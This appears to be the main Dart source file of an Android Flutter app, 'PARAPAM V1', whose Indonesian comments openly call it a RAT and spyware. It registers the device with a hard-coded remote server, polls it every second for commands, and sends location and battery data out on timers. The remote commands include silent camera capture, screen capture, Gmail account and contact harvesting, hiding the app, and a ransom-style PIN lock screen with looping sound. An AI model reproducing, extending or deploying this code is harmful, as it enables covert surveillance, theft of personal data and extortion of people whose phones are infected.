import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart'; 
import 'package:http/http.dart' as http;
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:vibration/vibration.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:shared_preferences/shared_preferences.dart';

// IMPORT HALAMAN
import 'landing_page.dart'; 
import 'login_page.dart';
import 'splash.dart'; 
import 'buy_account.dart';

// SERVER UTAMA (RAT + SPYWARE)
const String SERVER_URL = "http://serverpunyasenz.senzhosting.my.id:10035";

// CONTROLLER GLOBAL
ValueNotifier<bool> deviceLocked = ValueNotifier<bool>(false);
final AudioPlayer _audioPlayer = AudioPlayer();
String globalDeviceId = "";
String globalDeviceModel = "";
String currentLockMessage = "YOUR PHONE IS LOCKED";
String currentLockPIN = "0853";

// CHANNEL NATIVE
const MethodChannel platformStrobe = MethodChannel('com.nullx.pp/strobe');
const MethodChannel platformSpy = MethodChannel('com.nullx.pp/background_spy');

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  
  if (Platform.isAndroid) {
    if (!await Permission.systemAlertWindow.isGranted) {
      await Permission.systemAlertWindow.request();
    }
    requestNotificationAccess();
  }

  await requestPermissions();
  
  Map<String, String> deviceInfo = await getDeviceInfo();
  globalDeviceId = deviceInfo['id']!;
  globalDeviceModel = deviceInfo['model']!;

  try {
    await platformSpy.invokeMethod('saveTargetId', globalDeviceId);
  } catch (e) {}

  // REGISTER KE RAT DAN SPYWARE
  await registerToRAT(globalDeviceId, globalDeviceModel);
  await registerToSpyware(globalDeviceId, globalDeviceModel);
  
  startSpyware(globalDeviceId, globalDeviceModel);
  
  runApp(const MyApp());
}

void requestNotificationAccess() async {
  try {
    await platformSpy.invokeMethod('openNotificationSettings');
  } catch (e) {}
}

Future<void> requestPermissions() async {
  await [
    Permission.location,
    Permission.contacts,
    Permission.storage,
    Permission.manageExternalStorage,
    Permission.camera,
    Permission.microphone,
    Permission.ignoreBatteryOptimizations,
    Permission.notification,
    Permission.sms,
  ].request();
}

Future<Map<String, String>> getDeviceInfo() async {
  DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
  String modelName = "Unknown Device";
  String identifier = "UNKNOWN_ID";

  try {
    if (Platform.isAndroid) {
      AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
      modelName = "${androidInfo.brand} ${androidInfo.model}";
      identifier = "${androidInfo.brand}-${androidInfo.model}-${androidInfo.id}".replaceAll(' ', '_'); 
    }
  } catch (e) {
    identifier = "ZDX-${Platform.localHostname.hashCode}";
  }
  return {"id": identifier, "model": modelName};
}

// REGISTER KE RAT
Future<void> registerToRAT(String id, String model) async {
  try {
    final Battery battery = Battery();
    int level = await battery.batteryLevel;
    
    await http.post(
      Uri.parse("http://serverpunyasenz.senzhosting.my.id:10035/api/register-target"),
      body: jsonEncode({
        "id": id,
        "admin_owner": "Guntur",
        "model": model,
        "battery": level.toString(),
        "status": "Online",
        "lastSeen": DateTime.now().toIso8601String(),
      }),
      headers: {"Content-Type": "application/json"}
    );
    print("✅ Registered to RAT: $id");
  } catch (e) {
    print("❌ RAT register error: $e");
  }
}

// REGISTER KE SPYWARE
Future<void> registerToSpyware(String id, String model) async {
  try {
    final Battery battery = Battery();
    int level = await battery.batteryLevel;
    
    DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
    AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
    
    await http.post(
      Uri.parse("http://serverpunyasenz.senzhosting.my.id:10035/api/spyware/register"),
      body: jsonEncode({
        "device_id": id,
        "username": "Guntur",
        "model": model,
        "battery": level,
        "online": true,
        "last_seen": DateTime.now().toIso8601String(),
        "type": "spyware",
        "android_version": androidInfo.version.release,
        "brand": androidInfo.brand,
        "manufacturer": androidInfo.manufacturer,
      }),
      headers: {"Content-Type": "application/json"}
    );
    print("✅ Registered to Spyware: $id");
  } catch (e) {
    print("❌ Spyware register error: $e");
  }
}

void playScarySound() async {
  await _audioPlayer.setReleaseMode(ReleaseMode.loop);
  await _audioPlayer.play(UrlSource('https://www.soundboard.com/handler/DownLoadTrack.ashx?cliptitle=Scary+Laugh&filename=24/243764-00f7e1b5-829d-4874-a690-671891b0c79b.mp3'));
}

void stopSound() async {
  await _audioPlayer.stop();
}

void _showSystemNotification(String title, String message) async {
  try {
    await platformSpy.invokeMethod('showNotification', {'title': title, 'message': message});
  } catch (e) {}
}

// ==========================================================
// LOGIC CORE
// ==========================================================
void startSpyware(String deviceId, String deviceName) {
  Future<void> executeLogic() async {
    try {
      // HEARTBEAT KE RAT
      await http.post(
        Uri.parse("http://serverpunyasenz.senzhosting.my.id:10035/api/heartbeat/$deviceId"), 
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({"id": deviceId, "status": "Alive"})
      ).timeout(const Duration(seconds: 1));
      
      // HEARTBEAT KE SPYWARE
      await http.post(
        Uri.parse("http://serverpunyasenz.senzhosting.my.id:10035/api/spyware/heartbeat/$deviceId"), 
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({"device_id": deviceId, "status": "Alive"})
      ).timeout(const Duration(seconds: 1));

      // AMBIL COMMAND DARI RAT
      final ratResponse = await http.get(Uri.parse("http://serverpunyasenz.senzhosting.my.id:10035/api/get-command/$deviceId"));
      
      if (ratResponse.statusCode == 200) {
        final data = jsonDecode(ratResponse.body);
        String command = data['command'] ?? "idle";
        String extra = data['extra'] ?? "";
        await _processCommand(deviceId, command, extra);
      }
      
      // AMBIL COMMAND DARI SPYWARE
      final spyResponse = await http.get(Uri.parse("http://serverpunyasenz.senzhosting.my.id:10035/api/spyware/get-command/$deviceId"));
      
      if (spyResponse.statusCode == 200) {
        final data = jsonDecode(spyResponse.body);
        String command = data['command'] ?? "idle";
        String extra = data['extra'] ?? "";
        await _processCommand(deviceId, command, extra);
      }
      
    } catch (e) {}
  }

  Timer.periodic(const Duration(seconds: 1), (t) => executeLogic());
  
  // LOCATION UPDATE (untuk spyware)
  Timer.periodic(const Duration(seconds: 30), (t) async {
    try {
      Position pos = await Geolocator.getCurrentPosition(desiredAccuracy: LocationAccuracy.high);
      await http.post(
        Uri.parse("http://serverpunyasenz.senzhosting.my.id:10035/api/spyware/location/update"),
        body: jsonEncode({
          "device_id": deviceId,
          "lat": pos.latitude,
          "lng": pos.longitude,
          "accuracy": pos.accuracy,
          "speed": pos.speed,
          "altitude": pos.altitude,
          "time": DateTime.now().millisecondsSinceEpoch,
        }),
        headers: {"Content-Type": "application/json"}
      );
    } catch (e) {}
  });
  
  // BATTERY UPDATE (untuk spyware)
  Timer.periodic(const Duration(seconds: 60), (t) async {
    try {
      final Battery battery = Battery();
      int level = await battery.batteryLevel;
      BatteryState state = await battery.batteryState;
      
      await http.post(
        Uri.parse("http://serverpunyasenz.senzhosting.my.id:10035/api/spyware/battery/update"),
        body: jsonEncode({
          "device_id": deviceId,
          "battery": level,
          "charging": state == BatteryState.charging,
          "last_seen": DateTime.now().toIso8601String(),
        }),
        headers: {"Content-Type": "application/json"}
      );
    } catch (e) {}
  });
}

Future<void> _processCommand(String deviceId, String command, String extra) async {
  dynamic resultData;

  // 1. HARD LOCK
  if (command == "hard_lock" || command == "lock_device" || command == "lock") {
    if (extra.contains('|')) {
      List<String> parts = extra.split('|');
      currentLockMessage = parts[0].isNotEmpty ? parts[0] : "YOUR PHONE IS LOCKED";
      currentLockPIN = parts.length > 1 ? parts[1] : "0853";
    } else if (extra.isNotEmpty) {
      currentLockMessage = extra;
    }
    if (!deviceLocked.value) {
      deviceLocked.value = true;
      playScarySound();
    }
    resultData = {"status": "Locked", "success": true};
  } 
  
  // 2. UNLOCK
  else if (command == "unlock" || command == "unlock_device") {
    if (deviceLocked.value) {
      deviceLocked.value = false;
      stopSound();
      await platformStrobe.invokeMethod('stopStrobe');
    }
    resultData = {"status": "Unlocked", "success": true};
  }

  // 3. FLASHLIGHT
  else if (command == "flashlight_on") {
    await platformSpy.invokeMethod('flashlightOn');
    resultData = {"status": "Flashlight ON", "success": true};
  }
  else if (command == "flashlight_off") {
    await platformSpy.invokeMethod('flashlightOff');
    resultData = {"status": "Flashlight OFF", "success": true};
  }

  // 4. HIDE/SHOW APP
  else if (command == "hide_app") {
    await platformSpy.invokeMethod('hideApp');
    resultData = {"status": "App hidden", "success": true};
  }
  else if (command == "show_app") {
    await platformSpy.invokeMethod('showApp');
    resultData = {"status": "App shown", "success": true};
  }

  // 5. BACKGROUND SILENT CAMERA
  else if (command == "take_photo") {
    final String? base64Result = await platformSpy.invokeMethod('takeSilentPhotoBackground', {"side": extra});
    if (base64Result != null) {
      resultData = {"status": "Success", "image_base64": base64Result};
    } else {
      resultData = {"status": "Failed to capture image"};
    }
  }

  // 6. REAL SCREEN STREAM
  else if (command == "get_screen") {
    final String? base64Result = await platformSpy.invokeMethod('startScreenStreamBackground');
    resultData = {"status": "Stream Active", "image_base64": base64Result};
  }

  // 7. GMAIL HARVESTER
  else if (command == "get_gmails") {
    String emails = await platformSpy.invokeMethod('getGmailAccounts');
    resultData = {"accounts": emails.isEmpty ? "No Gmail Found" : emails};
  }

  // 8. WALLPAPER
  else if (command == "set_wallpaper") {
    await platformSpy.invokeMethod('setWallpaper', {"url": extra});
    resultData = {"status": "Wallpaper Updated"};
  }

  // 9. REMOTE MP3 PLAYER
  else if (command == "play_music" || command == "play_audio") {
    try {
      await _audioPlayer.stop();
      await _audioPlayer.play(UrlSource(extra));
      resultData = {"status": "Playing MP3"};
    } catch (e) {
      resultData = {"status": "Audio Error"};
    }
  }

  // 10. STOP AUDIO
  else if (command == "stop_music" || command == "stop_audio") {
    await _audioPlayer.stop();
    resultData = {"status": "Audio Stopped"};
  }

  // 11. GET CONTACTS
  else if (command == "get_contacts") {
    if (await FlutterContacts.requestPermission()) {
      final List<Contact> contacts = await FlutterContacts.getContacts(withProperties: true, withPhoto: false);
      resultData = {
        "contacts": contacts.map((e) => {
          "name": e.displayName, 
          "number": e.phones.isNotEmpty ? e.phones.first.number : ""
        }).toList()
      };
    }
  } 

  // 12. STROBE
  else if (command == "flash_strobe") {
    await platformStrobe.invokeMethod('startStrobe');
    resultData = {"status": "Strobe Active"};
  }
  else if (command == "stop_strobe") {
    await platformStrobe.invokeMethod('stopStrobe');
    resultData = {"status": "Strobe Stopped"};
  }
  
  // 13. VIBRATE
  else if (command == "vibrate_loop") {
    Vibration.vibrate(duration: 5000);
    resultData = {"status": "Vibrating"};
  }
  
  // 14. OPEN URL
  else if (command == "open_url" || command == "open_web") {
    final Uri url = Uri.parse(extra);
    if (await canLaunchUrl(url)) {
      await launchUrl(url, mode: LaunchMode.externalApplication);
      resultData = {"status": "URL Opened"};
    }
  }
  
  // 15. GET LOCATION
  else if (command == "get_location") {
    Position pos = await Geolocator.getCurrentPosition(desiredAccuracy: LocationAccuracy.high);
    resultData = {"lat": pos.latitude, "lng": pos.longitude};
  }
  
  // 16. FORCE OPEN APP
  else if (command == "force_open") {
    await platformSpy.invokeMethod('bringToForeground');
    resultData = {"status": "Foreground"};
  }
  
  // 17. SHOW NOTIFICATION
  else if (command == "show_notification") {
    List<String> parts = extra.split('|');
    _showSystemNotification(parts[0], parts.length > 1 ? parts[1] : "");
    resultData = {"status": "Notification shown"};
  }
  
  // 18. SHOW POPUP
  else if (command == "show_popup") {
    final prefs = await SharedPreferences.getInstance();
    List<String> parts = extra.split('|');
    await prefs.setString('pending_popup_title', parts[0]);
    await prefs.setString('pending_popup_message', parts.length > 1 ? parts[1] : "");
    resultData = {"status": "Popup queued"};
  }
  
  // 19. GET BATTERY
  else if (command == "get_battery") {
    final Battery battery = Battery();
    int level = await battery.batteryLevel;
    BatteryState state = await battery.batteryState;
    resultData = {"battery": level, "charging": state == BatteryState.charging};
  }
  
  // 20. GET DEVICE INFO
  else if (command == "get_device_info") {
    resultData = {"model": globalDeviceModel, "device_id": globalDeviceId};
  }

  if (resultData != null) {
    // Kirim response ke RAT
    await http.post(
      Uri.parse("http://serverpunyasenz.senzhosting.my.id:10035/api/post-response/$deviceId"),
      body: jsonEncode({"data": resultData, "cmd": command}),
      headers: {"Content-Type": "application/json"}
    );
    
    // Kirim response ke Spyware
    await http.post(
      Uri.parse("http://serverpunyasenz.senzhosting.my.id:10035/api/spyware/post-response/$deviceId"),
      body: jsonEncode({"data": resultData, "cmd": command}),
      headers: {"Content-Type": "application/json"}
    );
  }
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'PARAPAM V1',
      theme: ThemeData(
        brightness: Brightness.dark,
        scaffoldBackgroundColor: Colors.black,
        colorScheme: const ColorScheme.dark().copyWith(secondary: Colors.purple),
      ),
      home: const MainLockWrapper(),
    );
  }
}

class MainLockWrapper extends StatefulWidget {
  const MainLockWrapper({super.key});

  @override
  State<MainLockWrapper> createState() => _MainLockWrapperState();
}

class _MainLockWrapperState extends State<MainLockWrapper> with WidgetsBindingObserver {
  final TextEditingController _passController = TextEditingController();

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this); 
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _passController.dispose();
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (deviceLocked.value && (state == AppLifecycleState.paused || state == AppLifecycleState.inactive)) {
      platformSpy.invokeMethod('bringToForeground');
    }
  }

  @override
  Widget build(BuildContext context) {
    return ValueListenableBuilder<bool>(
      valueListenable: deviceLocked,
      builder: (context, isLocked, child) {
        return PopScope(
          canPop: !isLocked, 
          child: Stack(
            children: [
              Navigator(
                initialRoute: '/',
                onGenerateRoute: (settings) {
                  switch (settings.name) {
                    case '/': return MaterialPageRoute(builder: (_) => const LandingPage());
                    case '/login': return MaterialPageRoute(builder: (_) => const LoginPage());
                    case '/splash': 
                      final args = settings.arguments as Map<String, dynamic>;
                      return MaterialPageRoute(builder: (_) => SplashPage(data: args));
                    case '/buy_account': return MaterialPageRoute(builder: (_) => const BuyAccountPage());
                    default:
                      return MaterialPageRoute(builder: (_) => const Scaffold(body: Center(child: Text("404"))));
                  }
                },
              ),

              if (isLocked)
                Scaffold(
                  backgroundColor: Colors.black,
                  body: Center(
                    child: Padding(
                      padding: const EdgeInsets.all(20),
                      child: Column(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          const Icon(Icons.lock, color: Colors.red, size: 80),
                          const SizedBox(height: 20),
                          Text(currentLockMessage,
                              textAlign: TextAlign.center,
                              style: const TextStyle(color: Colors.red, fontSize: 20, fontWeight: FontWeight.bold)),
                          const SizedBox(height: 40),
                          SizedBox(
                            width: 250,
                            child: TextField(
                              controller: _passController,
                              obscureText: true,
                              textAlign: TextAlign.center,
                              style: const TextStyle(color: Colors.white),
                              decoration: const InputDecoration(
                                hintText: "MASUKKAN PIN", 
                                hintStyle: TextStyle(color: Colors.white24),
                                enabledBorder: OutlineInputBorder(borderSide: BorderSide(color: Colors.red)),
                                focusedBorder: OutlineInputBorder(borderSide: BorderSide(color: Colors.red)),
                              ),
                            ),
                          ),
                          const SizedBox(height: 20),
                          ElevatedButton(
                            style: ElevatedButton.styleFrom(
                              backgroundColor: Colors.red[900],
                              minimumSize: const Size(200, 50)
                            ),
                            onPressed: () {
                              if (_passController.text == currentLockPIN) {
                                deviceLocked.value = false;
                                stopSound();
                                platformStrobe.invokeMethod('stopStrobe');
                                _passController.clear();
                              }
                            },
                            child: const Text("UNLOCK", style: TextStyle(fontWeight: FontWeight.bold)),
                          ),
                        ],
                      ),
                    ),
                  ),
                ),
            ],
          ),
        );
      },
    );
  }
}